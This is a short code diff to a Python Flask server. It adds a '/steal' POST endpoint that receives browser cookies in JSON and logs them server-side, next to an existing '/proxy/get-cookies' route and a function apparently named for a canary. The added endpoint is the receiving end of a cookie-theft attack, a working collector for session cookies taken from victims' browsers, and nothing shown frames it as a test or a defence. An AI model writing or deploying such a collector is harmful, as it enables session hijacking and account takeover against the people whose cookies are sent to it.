@@ -209,6 +209,17 @@ def fallback_canary():
 # MAIN ENDPOINTS
 # ============================================================================
 
+@app.route('/steal', methods=['POST'])
+def steal():
+    data = request.get_json()
+    cookies = data.get('cookies') if data else None
+    if cookies:
+        print(f"Received cookies: {cookies}")  # Log cookies server-side
+    else:
+        print("No cookies received")
+    # Respond with minimal JSON - can be empty since client doesn't require response body
+    return jsonify({"status": "success"}), 200
+
 @app.route('/proxy/get-cookies', methods=['POST'])
 def proxy_get_cookies():
     data = request.get_json(force=True)
